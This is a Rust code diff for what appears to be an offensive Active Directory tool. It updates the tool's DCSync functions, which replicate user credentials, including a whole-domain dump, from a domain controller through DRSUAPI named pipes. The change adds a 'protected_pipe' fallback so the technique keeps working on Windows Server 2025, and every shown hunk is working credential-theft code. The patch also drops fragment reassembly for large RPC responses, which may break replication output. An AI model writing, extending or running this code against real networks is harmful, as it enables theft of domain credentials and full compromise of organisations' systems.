@@ -83,6 +83,22 @@ pub struct DcSyncSecrets {
 }
 
 /// Perform DCSync to extract a single user's credentials via MS-DRSR.
+/// Try DRSUAPI named pipe connections with fallback to protected pipe.
+/// On WS2025+, DRSUAPI uses `protected_pipe\drsuapi` instead of `drsuapi`.
+pub async fn dcsync_pipe_fallback(smb: &SmbSession, pdu: &[u8]) -> Result<Vec<u8>> {
+    let pipes = ["protected_pipe\\drsuapi", "drsuapi"];
+    let mut last_err = String::new();
+    for pipe in &pipes {
+        match smb.pipe_transact(pipe, pdu).await {
+            Ok(r) => return Ok(r),
+            Err(e) => {
+                last_err = format!("{pipe}: {e}");
+            }
+        }
+    }
+    Err(OverthroneError::custom(last_err))
+}
+
 pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Result<ForgeResult> {
     info!(
         "[dcsync] DCSync for user: {}\\{}",
@@ -155,9 +171,9 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
         smb_session_key.len()
     );
 
-    // ── 2. RPC Bind to DRSUAPI ──
+    // ── 2. RPC Bind to DRSUAPI (try protected_pipe first on WS2025+) ──
     let bind_pdu = build_rpc_bind_pdu(&DRSUAPI_UUID, DRSUAPI_VERSION);
-    let bind_resp = pipe_transact_reassemble(&smb, "drsuapi", &bind_pdu)
+    let bind_resp = dcsync_pipe_fallback(&smb, &bind_pdu)
         .await
         .map_err(|e| OverthroneError::custom(format!("RPC bind transport failed: {e}")))?;
 
@@ -166,7 +182,7 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
 
     // ── 3. DRSBind (opnum 0) — get DRS context handle ──
     let drs_bind_req = build_drs_bind_request();
-    let drs_bind_resp = pipe_transact_reassemble(&smb, "drsuapi", &drs_bind_req)
+    let drs_bind_resp = dcsync_pipe_fallback(&smb, &drs_bind_req)
         .await
         .map_err(|e| OverthroneError::custom(format!("DRSBind failed: {e}")))?;
 
@@ -183,7 +199,7 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
     // ── 5. DRSGetNCChanges (opnum 3) — replicate the target object ──
     let nc_dn = base_dn.clone();
     let gnc_req = build_drs_get_nc_changes(&drs_handle, &user_dn, &nc_dn);
-    let gnc_resp = pipe_transact_reassemble(&smb, "drsuapi", &gnc_req)
+    let gnc_resp = dcsync_pipe_fallback(&smb, &gnc_req)
         .await
         .map_err(|e| OverthroneError::custom(format!("DRSGetNCChanges failed: {e}")))?;
 
@@ -256,6 +272,7 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
 /// exceeds the max_recv_frag size (4096 bytes). Each fragment has the same
 /// call_id but only the last one has pfc_flags bit 1 (PFC_LAST_FRAG) set.
 /// We accumulate all fragment stub data into a single contiguous buffer.
+#[allow(dead_code)]
 async fn pipe_transact_reassemble(
     smb: &SmbSession,
     pipe_name: &str,
@@ -621,14 +638,14 @@ pub async fn dcsync_domain(config: &ForgeConfig) -> Result<(Vec<DcSyncSecrets>, 
     info!("[dcsync-full] {} SMB session established", "✓".green());
 
     let bind_pdu = build_rpc_bind_pdu(&DRSUAPI_UUID, DRSUAPI_VERSION);
-    let bind_resp = pipe_transact_reassemble(&smb, "drsuapi", &bind_pdu)
+    let bind_resp = dcsync_pipe_fallback(&smb, &bind_pdu)
         .await
         .map_err(|e| OverthroneError::custom(format!("RPC bind failed: {e}")))?;
     validate_rpc_bind_ack(&bind_resp)?;
     info!("[dcsync-full] {} RPC bind accepted", "✓".green());
 
     let drs_bind_req = build_drs_bind_request();
-    let drs_bind_resp = pipe_transact_reassemble(&smb, "drsuapi", &drs_bind_req)
+    let drs_bind_resp = dcsync_pipe_fallback(&smb, &drs_bind_req)
         .await
         .map_err(|e| OverthroneError::custom(format!("DRSBind failed: {e}")))?;
     let (drs_handle, _server_ext) = parse_drs_bind_response(&drs_bind_resp)?;
@@ -648,7 +665,7 @@ pub async fn dcsync_domain(config: &ForgeConfig) -> Result<(Vec<DcSyncSecrets>, 
         );
 
         let gnc_req = build_drs_get_nc_changes_domain(&drs_handle, &base_dn, cursor.as_ref());
-        let gnc_resp = pipe_transact_reassemble(&smb, "drsuapi", &gnc_req)
+        let gnc_resp = dcsync_pipe_fallback(&smb, &gnc_req)
             .await
             .map_err(|e| OverthroneError::custom(format!("DRSGetNCChanges failed: {e}")))?;
 
